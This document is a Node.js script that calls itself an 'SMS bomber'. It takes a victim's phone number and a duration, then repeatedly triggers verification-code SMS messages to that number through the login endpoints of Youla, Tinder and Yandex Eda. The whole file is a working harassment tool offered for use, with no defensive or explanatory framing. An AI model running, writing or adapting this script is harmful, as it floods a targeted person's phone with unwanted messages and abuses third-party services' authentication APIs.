const rp = require('request-promise');
const rl = require('readline-sync');

let number = rl.question('Please enter phone number (example: 79123456789): ');
let time = rl.question('Please enter the flood time in seconds (0 - infinite): ');

if (time == 0) time += 999999;

let sent = 0;

let youla = function() {
    var options = {
        method: 'POST',
        uri: 'https://youla.ru/web-api/auth/request_code',
        body: {
            phone: `${number}`
        },
        json: true
    };
    
    rp(options)
        .then(function (parsedBody) {
            sent += 1;
            console.log(`(${sent}) SMS sent`)
        })
        .catch(function (err) {
            sent += 1;
            console.log(`(${sent}) SMS not sent`)
        }); 
}

let tinder = function() {
    var options = {
        method: 'POST',
        uri: `https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru`,
        body: {
            phone_number: `${number}`
        },
        json: true
    };
    
    rp(options)
        .then(function (parsedBody) {
            sent += 1;
            console.log(`(${sent}) SMS sent`)
        })
        .catch(function (err) {
            sent += 1;
            console.log(`(${sent}) SMS not sent`)
        }); 
}

let yandexeda = function() {
    var options = {
        method: 'POST',
        uri: `https://eda.yandex/api/v1/user/request_authentication_code`,
        body: {
            phone_number: `${number}`
        },
        json: true
    };
    
    rp(options)
        .then(function (parsedBody) {
            sent += 1;
            console.log(`(${sent}) SMS sent`)
        })
        .catch(function (err) {
            sent += 1;
            console.log(`(${sent}) SMS not sent`)
        }); 
}

setInterval(async() => {
    youla();
    tinder();
    yandexeda();
}, 60000);

setTimeout( async() => {
    console.log(`SMS bomber operation is complete...`);
    process.exit(-1);
}, time * 1000);